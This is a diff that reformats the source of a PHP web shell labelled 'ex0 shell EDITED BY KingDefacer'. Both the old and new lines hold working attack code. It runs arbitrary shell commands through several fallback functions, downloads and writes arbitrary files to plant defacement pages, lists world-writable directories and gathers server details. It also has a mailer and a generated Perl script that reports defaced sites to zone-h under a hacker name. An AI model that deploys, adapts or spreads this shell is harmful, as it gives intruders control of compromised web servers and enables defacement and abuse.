@@ -8,47 +8,47 @@ Maked In Turk Edited And Translated By KingDefacer
 error_reporting(0);
 set_magic_quotes_runtime(0);
 
-if (version_compare(phpversion(), '4.1.0') == -1) {
-    $_POST   = &$HTTP_POST_VARS;
-    $_GET    = &$HTTP_GET_VARS;
+if (-1 == version_compare(phpversion(), '4.1.0')) {
+    $_POST = &$HTTP_POST_VARS;
+    $_GET = &$HTTP_GET_VARS;
     $_SERVER = &$HTTP_SERVER_VARS;
 }function inclink($link, $val)
 {
-    $requ=$_SERVER["REQUEST_URI"];
+    $requ = $_SERVER['REQUEST_URI'];
     if (strstr($requ, $link)) {
         return preg_replace("/$link=[\\d\\w\\W\\D\\S]*/", "$link=$val", $requ);
-    } elseif (strstr($requ, "showsc")) {
-        return preg_replace("/showsc=[\\d\\w\\W\\D\\S]*/", "$link=$val", $requ);
-    } elseif (strstr($requ, "hlp")) {
-        return preg_replace("/hlp=[\\d\\w\\W\\D\\S]*/", "$link=$val", $requ);
-    } elseif (strstr($requ, "?")) {
-        return $requ."&".$link."=".$val;
+    } elseif (strstr($requ, 'showsc')) {
+        return preg_replace('/showsc=[\\d\\w\\W\\D\\S]*/', "$link=$val", $requ);
+    } elseif (strstr($requ, 'hlp')) {
+        return preg_replace('/hlp=[\\d\\w\\W\\D\\S]*/', "$link=$val", $requ);
+    } elseif (strstr($requ, '?')) {
+        return $requ . '&' . $link . '=' . $val;
     } else {
-        return $requ."?".$link."=".$val;
+        return $requ . '?' . $link . '=' . $val;
     }
 }
 function delm($delmtxt)
 {
-    print"<center><table bgcolor=Black  style='border:1px solidDeepSkyBlue  ' width=99% height=2%>";
-    print"<tr><td><b><center><font size=3 color=DeepSkyBlue >$delmtxt</td></tr></table></center>";
+    echo"<center><table bgcolor=Black  style='border:1px solidDeepSkyBlue  ' width=99% height=2%>";
+    echo"<tr><td><b><center><font size=3 color=DeepSkyBlue >$delmtxt</td></tr></table></center>";
 }
 function callfuncs($cmnd)
 {
     if (function_exists(shell_exec)) {
-        $scmd=shell_exec($cmnd);
-        $nscmd=htmlspecialchars($scmd);
-        print $nscmd;
+        $scmd = shell_exec($cmnd);
+        $nscmd = htmlspecialchars($scmd);
+        echo $nscmd;
     } elseif (!function_exists(shell_exec)) {
         exec($cmnd, $ecmd);
         $ecmd = join("\n", $ecmd);
-        $necmd=htmlspecialchars($ecmd);
-        print $necmd;
+        $necmd = htmlspecialchars($ecmd);
+        echo $necmd;
     } elseif (!function_exists(exec)) {
-        $pcmd = popen($cmnd, "r");
+        $pcmd = popen($cmnd, 'r');
         while (!feof($pcmd)) {
             $res = htmlspecialchars(fgetc($pcmd));
-            ;
-            print $res;
+
+            echo $res;
         }
         pclose($pcmd);
     } elseif (!function_exists(popen)) {
@@ -56,55 +56,55 @@ function callfuncs($cmnd)
         system($cmnd);
         $sret = ob_get_contents();
         ob_clean();
-        print htmlspecialchars($sret);
+        echo htmlspecialchars($sret);
     } elseif (!function_exists(system)) {
         ob_start();
         passthru($cmnd);
         $pret = ob_get_contents();
         ob_clean();
-        print htmlspecialchars($pret);
+        echo htmlspecialchars($pret);
     }
 }
 function input($type, $name, $value, $size)
 {
     if (empty($value)) {
-        print "<input type=$type name=$name size=$size>";
-    } elseif (empty($name)&&empty($size)) {
-        print "<input type=$type value=$value >";
+        echo "<input type=$type name=$name size=$size>";
+    } elseif (empty($name) && empty($size)) {
+        echo "<input type=$type value=$value >";
     } elseif (empty($size)) {
-        print "<input type=$type name=$name value=$value >";
+        echo "<input type=$type name=$name value=$value >";
     } else {
-        print "<input type=$type name=$name value=$value size=$size >";
+        echo "<input type=$type name=$name value=$value size=$size >";
     }
 }
 function permcol($path)
 {
     if (is_writable($path)) {
-        print "<font color=red>";
+        echo '<font color=red>';
         callperms($path);
-        print "</font>";
-    } elseif (!is_readable($path)&&!is_writable($path)) {
-        print "<font color=DeepSkyBlue  >";
+        echo '</font>';
+    } elseif (!is_readable($path) && !is_writable($path)) {
+        echo '<font color=DeepSkyBlue  >';
         callperms($path);
-        print "</font>";
+        echo '</font>';
     } else {
-        print "<font color=DeepSkyBlue >";
+        echo '<font color=DeepSkyBlue >';
         callperms($path);
     }
 }
-if ($dlink=="dwld") {
+if ('dwld' == $dlink) {
     download($_REQUEST['dwld']);
 }
 function download($dwfile)
 {
     $size = filesize($dwfile);
     @header("Content-Type: application/force-download;name=$dwfile");
-    @header("Content-Transfer-Encoding: binary");
+    @header('Content-Transfer-Encoding: binary');
     @header("Content-Length: $size");
     @header("Content-Disposition: attachment; filename=$dwfile");
-    @header("Expires: 0");
-    @header("Cache-Control: no-cache, must-revalidate");
-    @header("Pragma: no-cache");
+    @header('Expires: 0');
+    @header('Cache-Control: no-cache, must-revalidate');
+    @header('Pragma: no-cache');
     @readfile($dwfile);
     exit;
 }
@@ -123,223 +123,223 @@ select{background-color: #191919; font-size: 12px; color: #dadada; font-family: 
 </body> 
 </html> 
 <?php
-$nscdir =(!isset($_REQUEST['scdir']))?getcwd():chdir($_REQUEST['scdir']);$nscdir=getcwd();
+$nscdir = (!isset($_REQUEST['scdir'])) ? getcwd() : chdir($_REQUEST['scdir']); $nscdir = getcwd();
 
-$sf="<form method=post>";$ef="</form>";
-$st="<table style=\"border:1px #dadada solid \" width=100% height=100%>";
-$et="</table>";$c1="<tr><td height=22% style=\"border:1px #dadada solid \">";
-$c2="<tr><td style=\"border:1px #dadada solid \">";$ec="</tr></td>";
-$sta="<textarea cols=157 rows=23>";$eta="</textarea>";
-$sfnt="<font face=tahoma size=2 color=DeepSkyBlue  >";$efnt="</font>";
-################# Ending of common variables ########################
+$sf = '<form method=post>'; $ef = '</form>';
+$st = '<table style="border:1px #dadada solid " width=100% height=100%>';
+$et = '</table>'; $c1 = '<tr><td height=22% style="border:1px #dadada solid ">';
+$c2 = '<tr><td style="border:1px #dadada solid ">'; $ec = '</tr></td>';
+$sta = '<textarea cols=157 rows=23>'; $eta = '</textarea>';
+$sfnt = '<font face=tahoma size=2 color=DeepSkyBlue  >'; $efnt = '</font>';
+//################ Ending of common variables ########################
 
-print"<table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%>";print"<tr><td>"; print"<b><center><font face=tahoma color=DeepSkyBlue   size=6>    ## ex0 shell EDITED BY KingDefacer ## 
-</font></b></center>"; print"</td></tr>";print"</table>";print "<br>";
-print"<table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%>";print"<tr><td>"; print"<center><div><b>";print "<a href=".inclink('dlink', 'home').">Home</a>";
-print " - <a href='javascript:history.back()'>Back</a>";
-print " - <a target='_blank' href=".inclink('dlink', 'phpinfo').">phpinfo</a>";
-if ($dlink=='phpinfo') {
-    print phpinfo();
+echo'<table bgcolor=#191919 style="border:2px #dadada solid " width=100% height=%>'; echo'<tr><td>'; echo'<b><center><font face=tahoma color=DeepSkyBlue   size=6>    ## ex0 shell EDITED BY KingDefacer ## 
+</font></b></center>'; echo'</td></tr>'; echo'</table>'; echo '<br>';
+echo'<table bgcolor=#191919 style="border:2px #dadada solid " width=100% height=%>'; echo'<tr><td>'; echo'<center><div><b>'; echo '<a href=' . inclink('dlink', 'home') . '>Home</a>';
+echo " - <a href='javascript:history.back()'>Back</a>";
+echo " - <a target='_blank' href=" . inclink('dlink', 'phpinfo') . '>phpinfo</a>';
+if ('phpinfo' == $dlink) {
+    echo phpinfo();
     die();
 }
-print " - <a href=".inclink('dlink', 'basepw').">Base64 decode</a>";
-print " - <a href=".inclink('dlink', 'urld').">Url decode</a>";
-print " - <a href=".inclink('dlink', 'urlen').">Url encode</a>";
-print " - <a href=".inclink('dlink', 'mdf').">Md5</a>";
-print " - <a href=".inclink('dlink', 'perm')."&scdir=$nscdir>Check permissions</a>";
-print " - <a href=".inclink('dlink', 'showsrc')."&scdir=$nscdir>File source</a>";
-print " - <a href=".inclink('dlink', 'qindx')."&scdir=$nscdir>Quick index</a>";
-print " - <a href=".inclink('dlink', 'zone')."&scdir=$nscdir>Zone-h</a>";
-print " - <a href=".inclink('dlink', 'mail')."&scdir=$nscdir>Mail</a>";
-print " - <a href=".inclink('dlink', 'cmdhlp')."&scdir=$nscdir>Cmd help</a>";
+echo ' - <a href=' . inclink('dlink', 'basepw') . '>Base64 decode</a>';
+echo ' - <a href=' . inclink('dlink', 'urld') . '>Url decode</a>';
+echo ' - <a href=' . inclink('dlink', 'urlen') . '>Url encode</a>';
+echo ' - <a href=' . inclink('dlink', 'mdf') . '>Md5</a>';
+echo ' - <a href=' . inclink('dlink', 'perm') . "&scdir=$nscdir>Check permissions</a>";
+echo ' - <a href=' . inclink('dlink', 'showsrc') . "&scdir=$nscdir>File source</a>";
+echo ' - <a href=' . inclink('dlink', 'qindx') . "&scdir=$nscdir>Quick index</a>";
+echo ' - <a href=' . inclink('dlink', 'zone') . "&scdir=$nscdir>Zone-h</a>";
+echo ' - <a href=' . inclink('dlink', 'mail') . "&scdir=$nscdir>Mail</a>";
+echo ' - <a href=' . inclink('dlink', 'cmdhlp') . "&scdir=$nscdir>Cmd help</a>";
 if (isset($_REQUEST['ncbase'])) {
-    $cbase =(base64_decode($_REQUEST['ncbase']));
-    print "<p>Result is : $sfnt".$cbase."$efnt";
+    $cbase = (base64_decode($_REQUEST['ncbase']));
+    echo "<p>Result is : $sfnt" . $cbase . "$efnt";
     die();
 }
-if ($dlink=="basepw") {
-    print "<p><b>[ Base64 - Decoder ]</b>";
-    print $sf;
-    input("text", "ncbase", $ncbase, 35);
-    print " ";
-    input("submit", "", "Decode", "");
-    print $ef;
+if ('basepw' == $dlink) {
+    echo '<p><b>[ Base64 - Decoder ]</b>';
+    echo $sf;
+    input('text', 'ncbase', $ncbase, 35);
+    echo ' ';
+    input('submit', '', 'Decode', '');
+    echo $ef;
     die();
 }
 if (isset($_REQUEST['nurld'])) {
-    $urldc =(urldecode($_REQUEST['nurld']));
-    print "<p>Result is : $sfnt".$urldc."$efnt";
+    $urldc = (urldecode($_REQUEST['nurld']));
+    echo "<p>Result is : $sfnt" . $urldc . "$efnt";
     die();
-} if ($dlink=='urld') {
-    print "<p><b>[ Url - Decoder ]</b>";
-    print $sf;
-    input("text", "nurld", $nurld, 35);
-    print " ";
-    input("submit", "", "Decode", "");
-    print $ef;
+} if ('urld' == $dlink) {
+    echo '<p><b>[ Url - Decoder ]</b>';
+    echo $sf;
+    input('text', 'nurld', $nurld, 35);
+    echo ' ';
+    input('submit', '', 'Decode', '');
+    echo $ef;
     die();
 }
 if (isset($_REQUEST['nurlen'])) {
-    $urlenc =(urlencode(stripslashes($_REQUEST['nurlen'])));
-    print "<p>Result is : $sfnt".$urlenc."$efnt";
+    $urlenc = (urlencode(stripslashes($_REQUEST['nurlen'])));
+    echo "<p>Result is : $sfnt" . $urlenc . "$efnt";
     die();
 }
-if ($dlink=='urlen') {
-    print "<p><b>[ Url - Encoder ]</b>";
-    print $sf;
-    input("text", "nurlen", $nurlen, 35);
-    print " ";
-    input("submit", "", "Encode", "");
-    print $ef;
+if ('urlen' == $dlink) {
+    echo '<p><b>[ Url - Encoder ]</b>';
+    echo $sf;
+    input('text', 'nurlen', $nurlen, 35);
+    echo ' ';
+    input('submit', '', 'Encode', '');
+    echo $ef;
     die();
 }
 if (isset($_REQUEST['nmdf'])) {
-    $mdfe =(md5($_REQUEST['nmdf']));
-    print "<p>Result is : $sfnt".$mdfe."$efnt";
+    $mdfe = (md5($_REQUEST['nmdf']));
+    echo "<p>Result is : $sfnt" . $mdfe . "$efnt";
     die();
-} if ($dlink=='mdf') {
-    print "<p><b>[ MD5 - Encoder ]</b>";
-    print $sf;
-    input("text", "nmdf", $nmdf, 35);
-    print " ";
-    input("hidden", "scdir", $scdir, 22);
-    input("submit", "", "Encode", "");
-    print $ef;
+} if ('mdf' == $dlink) {
+    echo '<p><b>[ MD5 - Encoder ]</b>';
+    echo $sf;
+    input('text', 'nmdf', $nmdf, 35);
+    echo ' ';
+    input('hidden', 'scdir', $scdir, 22);
+    input('submit', '', 'Encode', '');
+    echo $ef;
     die();
-} if ($dlink=='perm') {
-    print $sf;
-    input("submit", "mfldr", "Main-fldr", "");
-    print " ";
-    input("submit", "sfldr", "Sub-fldr", "");
-    print $ef;
-    print "<pre>";
-    print "<p><textarea cols=120 rows=12>";
+} if ('perm' == $dlink) {
+    echo $sf;
+    input('submit', 'mfldr', 'Main-fldr', '');
+    echo ' ';
+    input('submit', 'sfldr', 'Sub-fldr', '');
+    echo $ef;
+    echo '<pre>';
+    echo '<p><textarea cols=120 rows=12>';
     if (isset($_REQUEST['mfldr'])) {
         callfuncs('find . -type d -perm -2 -ls');
     } elseif (isset($_REQUEST['sfldr'])) {
         callfuncs('find ../ -type d -perm -2 -ls');
     }
-    print "</textarea>";
-    print "</pre>";
+    echo '</textarea>';
+    echo '</pre>';
     die();
 }
 function callshsrc($showsc)
 {
-    if (isset($showsc)&&filesize($showsc)=="0") {
-        print "<p><b>[ Sorry, U choosed an empty file or the file not exists ]";
+    if (isset($showsc) && '0' == filesize($showsc)) {
+        echo '<p><b>[ Sorry, U choosed an empty file or the file not exists ]';
         die();
-    } elseif (isset($showsc)&&filesize($showsc) !=="0") {
-        print "<p><table width=100% height=10% bgcolor=#dadada border=1><tr><td>";
-        if (!show_source($showsc)||!function_exists('show_source')) {
-            print "<center><font color=black size=2><b>[ Sorry can't complete the operation ]</font></center>";
+    } elseif (isset($showsc) && '0' !== filesize($showsc)) {
+        echo '<p><table width=100% height=10% bgcolor=#dadada border=1><tr><td>';
+        if (!show_source($showsc) || !function_exists('show_source')) {
+            echo "<center><font color=black size=2><b>[ Sorry can't complete the operation ]</font></center>";
             die();
         }
-        print "</td></tr></table>";
+        echo '</td></tr></table>';
         die();
     }
-} if ($dlink=='showsrc') {
-    print "<p><b>: Choose a php file to view in a color mode, any extension else will appears as usual :";
-    print "<form method=get>";
-    input("text", "showsc", "", 35);
-    print " ";
-    input("hidden", "scdir", $scdir, 22);
-    input("submit", "subshsc", "Show-src", "");
-    print $ef;
+} if ('showsrc' == $dlink) {
+    echo '<p><b>: Choose a php file to view in a color mode, any extension else will appears as usual :';
+    echo '<form method=get>';
+    input('text', 'showsc', '', 35);
+    echo ' ';
+    input('hidden', 'scdir', $scdir, 22);
+    input('submit', 'subshsc', 'Show-src', '');
+    echo $ef;
     die();
 } if (isset($_REQUEST['showsc'])) {
     callshsrc(trim($_REQUEST['showsc']));
 }
-if ($dlink=='cmdhlp') {
-    print "<p><b>: Insert the command below to get help or to know more about it's uses :";
-    print "<form method=get>";
-    input("text", "hlp", "", 35);
-    print " ";
-    input("submit", "", "Help", "");
-    print $ef;
+if ('cmdhlp' == $dlink) {
+    echo "<p><b>: Insert the command below to get help or to know more about it's uses :";
+    echo '<form method=get>';
+    input('text', 'hlp', '', 35);
+    echo ' ';
+    input('submit', '', 'Help', '');
+    echo $ef;
     die();
 }
 if (isset($_REQUEST['hlp'])) {
-    $hlp=$_REQUEST['hlp'];
-    print "<p><b>[ The command is $sfnt".$hlp."$efnt ]";
+    $hlp = $_REQUEST['hlp'];
+    echo "<p><b>[ The command is $sfnt" . $hlp . "$efnt ]";
     $hlp = escapeshellcmd($hlp);
-    print "<p><table width=100% height=30% bgcolor=#dadada border=2><tr><td>";
-    if (!function_exists(shell_exec)&&!function_exists(exec)&&
-!function_exists(popen)&&!function_exists(system)&&!function_exists(passthru)) {
-        print "<center><font color=black size=2><b>[ Sorry can't complete the operation ]</font></center>";
+    echo '<p><table width=100% height=30% bgcolor=#dadada border=2><tr><td>';
+    if (!function_exists(shell_exec) && !function_exists(exec) &&
+!function_exists(popen) && !function_exists(system) && !function_exists(passthru)) {
+        echo "<center><font color=black size=2><b>[ Sorry can't complete the operation ]</font></center>";
     } else {
-        print "<pre><font color=black>";
+        echo '<pre><font color=black>';
         if (!callfuncs("man $hlp | col -b")) {
-            print "<center><font size=2><b>[ Finished !! ]";
+            echo '<center><font size=2><b>[ Finished !! ]';
         }
-        print "</pre></font>";
+        echo '</pre></font>';
     }
-    print "</td></tr></table>";
+    echo '</td></tr></table>';
     die();
 }
-if (isset($_REQUEST['indx'])&&!empty($_REQUEST['indxtxt'])) {
-    if (touch($_REQUEST['indx'])==true) {
-        $fp=fopen($_REQUEST['indx'], "w+");
+if (isset($_REQUEST['indx']) && !empty($_REQUEST['indxtxt'])) {
+    if (true == touch($_REQUEST['indx'])) {
+        $fp = fopen($_REQUEST['indx'], 'w+');
         fwrite($fp, stripslashes($_REQUEST['indxtxt']));
         fclose($fp);
-        print "<p>[ $sfnt".$_REQUEST['indx']."$efnt created successfully !! ]</p>";
-        print "<b><center>[ <a href='javascript:history.back()'>Yeniden Editle</a>
-] -- [<a href=".inclink('dlink', 'scurrdir')."&scdir=$nscdir> Curr-Dir </a>]</center></b>";
+        echo "<p>[ $sfnt" . $_REQUEST['indx'] . "$efnt created successfully !! ]</p>";
+        echo "<b><center>[ <a href='javascript:history.back()'>Yeniden Editle</a>
+] -- [<a href=" . inclink('dlink', 'scurrdir') . "&scdir=$nscdir> Curr-Dir </a>]</center></b>";
         die();
     } else {
-        print "<p>[ Sorry, Can't create the index !! ]</p>";
+        echo "<p>[ Sorry, Can't create the index !! ]</p>";
         die();
     }
 }
-if ($dlink=='qindx'&&!isset($_REQUEST['qindsub'])) {
-    print $sf."<br>";
-    print "<p><textarea cols=50 rows=10 name=indxtxt>
-Your index contents here</textarea></p>";
-    input("text", "indx", "Index-name", 35);
-    print " ";
-    input("submit", "qindsub", "Create", "");
-    print $ef;
+if ('qindx' == $dlink && !isset($_REQUEST['qindsub'])) {
+    echo $sf . '<br>';
+    echo '<p><textarea cols=50 rows=10 name=indxtxt>
+Your index contents here</textarea></p>';
+    input('text', 'indx', 'Index-name', 35);
+    echo ' ';
+    input('submit', 'qindsub', 'Create', '');
+    echo $ef;
     die();
 }
-if (isset($_REQUEST['mailsub'])&&!empty($_REQUEST['mailto'])) {
-    $mailto=$_REQUEST['mailto'];
-    $subj=$_REQUEST['subj'];
-    $mailtxt=$_REQUEST['mailtxt'];
+if (isset($_REQUEST['mailsub']) && !empty($_REQUEST['mailto'])) {
+    $mailto = $_REQUEST['mailto'];
+    $subj = $_REQUEST['subj'];
+    $mailtxt = $_REQUEST['mailtxt'];
     if (mail($mailto, $subj, $mailtxt)) {
-        print "<p>[ Mail sended to $sfnt".$mailto." $efnt successfully ]</p>";
+        echo "<p>[ Mail sended to $sfnt" . $mailto . " $efnt successfully ]</p>";
         die();
     } else {
-        print "<p>[ Error, Can't send the mail ]</p>";
+        echo "<p>[ Error, Can't send the mail ]</p>";
         die();
     }
-} elseif (isset($mailsub)&&empty($mailto)) {
-    print "<p>[ Error, Can't send the mail ]</p>";
+} elseif (isset($mailsub) && empty($mailto)) {
+    echo "<p>[ Error, Can't send the mail ]</p>";
     die();
 }
-if ($dlink=='mail'&&!isset($_REQUEST['mailsub'])) {
-    print $sf."<br>";
-    print "<p><textarea cols=50 rows=10 name=mailtxt>
-Your message here</textarea></p>";
-    input("text", "mailto", "example@mail.com", 35);
-    print " ";
-    input("text", "subj", "Title-here", 20);
-    print " ";
-    input("submit", "mailsub", "Send-mail", "");
-    print $ef;
+if ('mail' == $dlink && !isset($_REQUEST['mailsub'])) {
+    echo $sf . '<br>';
+    echo '<p><textarea cols=50 rows=10 name=mailtxt>
+Your message here</textarea></p>';
+    input('text', 'mailto', 'example@mail.com', 35);
+    echo ' ';
+    input('text', 'subj', 'Title-here', 20);
+    echo ' ';
+    input('submit', 'mailsub', 'Send-mail', '');
+    echo $ef;
     die();
 }
-if (isset($_REQUEST['zonet'])&&!empty($_REQUEST['zonet'])) {
+if (isset($_REQUEST['zonet']) && !empty($_REQUEST['zonet'])) {
     callzone($nscdir);
 }
 function callzone($nscdir)
 {
     if (is_writable($nscdir)) {
-        $fpz=fopen("z.pl", "w");
-        $zpl='z.pl';
-        $li="bklist.txt";
+        $fpz = fopen('z.pl', 'w');
+        $zpl = 'z.pl';
+        $li = 'bklist.txt';
     } else {
-        $fpz=fopen("/tmp/z.pl", "w");
-        $zpl='/tmp/z.pl';
-        $li="/tmp/bklist.txt";
+        $fpz = fopen('/tmp/z.pl', 'w');
+        $zpl = '/tmp/z.pl';
+        $li = '/tmp/bklist.txt';
     }
     fwrite($fpz, "\$arq = @ARGV[0];
 \$grupo = @ARGV[1];
@@ -367,450 +367,450 @@ print \$sock \"Pragma: no-cache\r\n\";
 print \$sock \"\r\n\";
 print \$sock \"notify_defacer=\$grupo&notify_domain=http%3A%2F%2F\$site[\$a]&notify_hackmode=22&notify_reason=5&notify=+OK+\r\n\";
 close(\$sock);}");
-    if (touch($li)==true) {
-        $fpl=fopen($li, "w+");
+    if (true == touch($li)) {
+        $fpl = fopen($li, 'w+');
         fwrite($fpl, $_REQUEST['zonetxt']);
     } else {
-        print "<p>[ Can't complete the operation, try change the current dir with writable one ]<br>";
+        echo "<p>[ Can't complete the operation, try change the current dir with writable one ]<br>";
     }
-    $zonet=$_REQUEST['zonet'];
-    if (!function_exists(exec)&&!function_exists(shell_exec)&&!function_exists(popen)&&!function_exists(system)&&!function_exists(passthru)) {
-        print "[ Can't complete the operation !! ]";
+    $zonet = $_REQUEST['zonet'];
+    if (!function_exists(exec) && !function_exists(shell_exec) && !function_exists(popen) && !function_exists(system) && !function_exists(passthru)) {
+        echo "[ Can't complete the operation !! ]";
     } else {
         callfuncs("chmod 777 $zpl;chmod 777 $li");
         ob_start();
         callfuncs("perl $zpl $li $zonet");
         ob_clean();
-        print "<p>[ All sites should be sended to zone-h.org successfully !! ]";
+        echo '<p>[ All sites should be sended to zone-h.org successfully !! ]';
         die();
     }
-} if ($dlink=='zone'&&!isset($_REQUEST['zonesub'])) {
-    print $sf."<br>";
-    print "<p><pre><textarea cols=50 rows=10 name=zonetxt>
+} if ('zone' == $dlink && !isset($_REQUEST['zonesub'])) {
+    echo $sf . '<br>';
+    echo '<p><pre><textarea cols=50 rows=10 name=zonetxt>
 www.site1.com
 www.site2.com
-</textarea></pre></p>";
-    input("text", "zonet", "Hacker-name", 35);
-    print " ";
-    input("submit", "zonesub", "Send", "");
-    print $ef;
+</textarea></pre></p>';
+    input('text', 'zonet', 'Hacker-name', 35);
+    echo ' ';
+    input('submit', 'zonesub', 'Send', '');
+    echo $ef;
     die();
 }
-print "</div></b></center>"; print"</td></tr>";print"</table>";print "<br>";
+echo '</div></b></center>'; echo'</td></tr>'; echo'</table>'; echo '<br>';
 function inisaf($iniv)
 {
-    $chkini=ini_get($iniv);
-    if (($chkini || strtolower($chkini)) !=='on') {
-        print"<font color=green ><b>OFF ( NOT SECURITY )</b></font>";
+    $chkini = ini_get($iniv);
+    if ('on' !== ($chkini || strtolower($chkini))) {
+        echo'<font color=green ><b>OFF ( NOT SECURITY )</b></font>';
     } else {
-        print"<font color=red><b>Acik ( Guvenli )</b></font>";
+        echo'<font color=red><b>Acik ( Guvenli )</b></font>';
     }
 }function inifunc($inif)
 {
-    $chkin=ini_get($inif);
-    if ($chkin=="") {
-        print " <font color=red><b>None</b></font>";
+    $chkin = ini_get($inif);
+    if ('' == $chkin) {
+        echo ' <font color=red><b>None</b></font>';
     } else {
-        $nchkin=wordwrap($chkin, 40, "\n", 1);
-        print "<b><font color=DeepSkyBlue  >".$nchkin."</font></b>";
+        $nchkin = wordwrap($chkin, 40, "\n", 1);
+        echo '<b><font color=DeepSkyBlue  >' . $nchkin . '</font></b>';
     }
 }function callocmd($ocmd, $owhich)
 {
     if (function_exists(exec)) {
-        $nval=exec($ocmd);
+        $nval = exec($ocmd);
     } elseif (!function_exists(exec)) {
-        $nval=shell_exec($ocmd);
+        $nval = shell_exec($ocmd);
     } elseif (!function_exists(shell_exec)) {
-        $opop=popen($ocmd, 'r');
+        $opop = popen($ocmd, 'r');
         while (!feof($opop)) {
-            $nval= fgetc($opop);
+            $nval = fgetc($opop);
         }
     } elseif (!function_exists(popen)) {
         ob_start();
         system($ocmd);
-        $nval=ob_get_contents();
+        $nval = ob_get_contents();
         ob_clean();
     } elseif (!function_exists(system)) {
         ob_start();
         passthru($ocmd);
-        $nval=ob_get_contents();
+        $nval = ob_get_contents();
         ob_clean();
     }
-    if ($nval=$owhich) {
-        print"<font color=red><b>ON</b></font>";
+    if ($nval = $owhich) {
+        echo'<font color=red><b>ON</b></font>';
     } else {
-        print"<font color=DeepSkyBlue  ><b>OFF</b></font>";
+        echo'<font color=DeepSkyBlue  ><b>OFF</b></font>';
     }
 }
-print"<table bgcolor=#191919 style=\"border:2px #dadada solid ;font-size:13px;font-family:tahoma \" width=100% height=%>";
-print"<tr><td>"; print"<center><br>";
-print"<b>Safe-mode :\t";print inisaf('safe_mode');print "</b>";print"</center>";
-if (!function_exists(exec)&&!function_exists(shell_exec)&&!function_exists(popen)&&!function_exists(system)&&!function_exists(passthru)||strstr(PHP_OS, "WIN")) {
-    print "";
+echo'<table bgcolor=#191919 style="border:2px #dadada solid ;font-size:13px;font-family:tahoma " width=100% height=%>';
+echo'<tr><td>'; echo'<center><br>';
+echo"<b>Safe-mode :\t"; echo inisaf('safe_mode'); echo '</b>'; echo'</center>';
+if (!function_exists(exec) && !function_exists(shell_exec) && !function_exists(popen) && !function_exists(system) && !function_exists(passthru) || strstr(PHP_OS, 'WIN')) {
+    echo '';
 } else {
-    print "<table bgcolor=#191919 width=100% height=% style='font-size:13px;font-family:tahoma'><tr><td>";
-    print "<div align=center>";
-    print"<br><b>Mysql : </b>";
+    echo "<table bgcolor=#191919 width=100% height=% style='font-size:13px;font-family:tahoma'><tr><td>";
+    echo '<div align=center>';
+    echo'<br><b>Mysql : </b>';
     callocmd('which mysql', '/usr/bin/mysql');
-    print"</td>";
-    print"<td>";
-    print"<br><b>Perl : </b>";
-    callocmd('which perl', ('/usr/bin/perl')||'/usr/local/bin/perl');
-    print"</td>";
-    print"<td>";
-    print"<br><b>Gcc : </b>";
+    echo'</td>';
+    echo'<td>';
+    echo'<br><b>Perl : </b>';
+    callocmd('which perl', ('/usr/bin/perl') || '/usr/local/bin/perl');
+    echo'</td>';
+    echo'<td>';
+    echo'<br><b>Gcc : </b>';
     callocmd('which gcc', '/usr/bin/gcc');
-    print"</td>";
-    print"<td>";
-    print"<br><b>Curl : </b>";
+    echo'</td>';
+    echo'<td>';
+    echo'<br><b>Curl : </b>';
     callocmd('which curl', '/usr/bin/curl');
-    print"</td>";
-    print"<td>";
-    print"<br><b>GET : </b>";
+    echo'</td>';
+    echo'<td>';
+    echo'<br><b>GET : </b>';
     callocmd('which GET', '/usr/bin/GET');
-    print"</td>";
-    print"<td>";
-    print"<br><b>Wget : </b>";
+    echo'</td>';
+    echo'<td>';
+    echo'<br><b>Wget : </b>';
     callocmd('which wget', '/usr/bin/wget');
-    print"</td>";
-    print"<td>";
-    print"<br><b>Lynx : </b>";
+    echo'</td>';
+    echo'<td>';
+    echo'<br><b>Lynx : </b>';
     callocmd('which lynx', '/usr/bin/lynx');
-    print"</td>";
-    print "</tr></table>";
-}print "<hr><br>";
-print "<b>YOUR IP: ".$REMOTE_ADDR."<br></b>";
-print "<b>Server IP : ".$SERVER_ADDR."</b>";
-print"<br><b>".$SERVER_SIGNATURE."</b>";
-print "<b>Server NAME : ".$SERVER_NAME." / "."Email : ".$SERVER_ADMIN."<br></b>";
-print "<b>Disabled Functions : </b>";inifunc(disable_functions);print"<br>";
-print "<b>Your Infos : <b>"; callfuncs('id');print"<br><b>Os : </b>";
-if (strstr(PHP_OS, "WIN")) {
-    print php_uname();
-    print " ";
-    print PHP_OS;
+    echo'</td>';
+    echo '</tr></table>';
+}echo '<hr><br>';
+echo '<b>YOUR IP: ' . $REMOTE_ADDR . '<br></b>';
+echo '<b>Server IP : ' . $SERVER_ADDR . '</b>';
+echo'<br><b>' . $SERVER_SIGNATURE . '</b>';
+echo '<b>Server NAME : ' . $SERVER_NAME . ' / ' . 'Email : ' . $SERVER_ADMIN . '<br></b>';
+echo '<b>Disabled Functions : </b>'; inifunc(disable_functions); echo'<br>';
+echo '<b>Your Infos : <b>'; callfuncs('id'); echo'<br><b>Os : </b>';
+if (strstr(PHP_OS, 'WIN')) {
+    echo php_uname();
+    echo ' ';
+    echo PHP_OS;
 } else {
-    if (!function_exists(shell_exec)&&!function_exists(exec)&&
-!function_exists(popen)&&!function_exists(system)&&!function_exists(passthru)) {
-        print php_uname();
-        print "/";
-        print PHP_OS;
+    if (!function_exists(shell_exec) && !function_exists(exec) &&
+!function_exists(popen) && !function_exists(system) && !function_exists(passthru)) {
+        echo php_uname();
+        echo '/';
+        echo PHP_OS;
     } else {
         callfuncs('uname -a');
     }
-}print"<br>";
-print"Php-Version : ".phpversion(); print"<br><b>Current-path : </b>";
-print $nscdir."&nbsp;&nbsp;&nbsp;&nbsp; [ ";permcol($nscdir);print " ]";
-print"<br>";print "Your shells location : " .__file__;
-print"<br> Disc Spase: "; readable_size(disk_total_space($nscdir));print " / ";
-print"Bos Alan: "; readable_size(disk_free_space($nscdir));
-print "</center><br></font>"; print"</td></tr></table><br>";
+}echo'<br>';
+echo'Php-Version : ' . phpversion(); echo'<br><b>Current-path : </b>';
+echo $nscdir . '&nbsp;&nbsp;&nbsp;&nbsp; [ '; permcol($nscdir); echo ' ]';
+echo'<br>'; echo 'Your shells location : ' . __FILE__;
+echo'<br> Disc Spase: '; readable_size(disk_total_space($nscdir)); echo ' / ';
+echo'Bos Alan: '; readable_size(disk_free_space($nscdir));
+echo '</center><br></font>'; echo'</td></tr></table><br>';
 if (isset($_REQUEST['credir'])) {
-    $ndir=trim($_REQUEST['dir']);
+    $ndir = trim($_REQUEST['dir']);
     if (mkdir($ndir, 0777)) {
-        $mess=basename($ndir)." created successfully";
+        $mess = basename($ndir) . ' created successfully';
     } else {
